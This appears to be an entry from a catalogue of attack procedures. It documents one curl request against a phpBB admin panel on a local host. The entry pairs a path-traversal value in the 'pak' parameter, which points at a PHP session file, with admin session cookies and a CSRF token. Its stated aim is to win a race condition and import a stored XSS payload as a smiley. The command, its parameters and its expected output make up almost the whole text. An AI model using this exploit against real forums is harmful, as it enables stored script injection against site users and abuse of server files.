---
data: >-
  curl -X POST
  "http://127.0.0.1:8082/adm/index.php?i=acp_icons&mode=smilies&current=delete"
  -H "Content-Type: application/x-www-form-urlencoded" -H "Cookie:
  csrftoken=Ky6rB5uThxl3PwYd6EScmT9WXYiH6rGe;
  sessionid=hmrhwwo5hj5abu4kqgln2let1x9zudbr;
  phpbb3_cbvpk_sid=3fd08be6c8fc002f417821755ad2ae25; phpbb3_cbvpk_u=2;
  phpbb3_cbvpk_k=; phpbb3_83bmg_u=1; phpbb3_83bmg_k=;
  phpbb3_83bmg_sid=46114d6cd0db772e20e92dc60b68de23;
  phpbb3_cbvpk_k=;PHPSESSID=shin24" -d
  "action=import&pak=../../../../../../../../../var/lib/php/sessions/sess_shin24&form_token=68340f4826dcfa788b02f1d01ad3b74b06b64bde&creation_time=1695113245"
tags:
  - xss
  - path-traversal
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:55:06.076Z'
id: c7d7505f-65d9-42b5-b1ec-d9d7204ba864
verified: false
validated: true
submitted: true
---
---

# phpbb-path-traversal-xss-import

## Command

```bash
curl -X POST "http://127.0.0.1:8082/adm/index.php?i=acp_icons&mode=smilies&current=delete" -H "Content-Type: application/x-www-form-urlencoded" -H "Cookie: csrftoken=Ky6rB5uThxl3PwYd6EScmT9WXYiH6rGe; sessionid=hmrhwwo5hj5abu4kqgln2let1x9zudbr; phpbb3_cbvpk_sid=3fd08be6c8fc002f417821755ad2ae25; phpbb3_cbvpk_u=2; phpbb3_cbvpk_k=; phpbb3_83bmg_u=1; phpbb3_83bmg_k=; phpbb3_83bmg_sid=46114d6cd0db772e20e92dc60b68de23; phpbb3_cbvpk_k=;PHPSESSID=shin24" -d "action=import&pak=../../../../../../../../../var/lib/php/sessions/sess_shin24&form_token=68340f4826dcfa788b02f1d01ad3b74b06b64bde&creation_time=1695113245"
```

## Description

Imports from a traversed path to a temporary session file containing XSS payload, completing the race condition to store malicious emoji.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| pak | Traversal to sess file (e.g., ../../../../../../../../../var/lib/php/sessions/sess_shin24) | Yes |
| action | 'import' | Yes |
| form_token | CSRF token | Yes |
| creation_time | Timestamp | Yes |

## Examples

### Basic Usage

```bash
curl ... (as above)
```

## Expected Output

Success message if raced correctly; emoji added to database.

## Related

- [[Related Procedure: Exploit-Race-Condition-for-XSS-Import]]
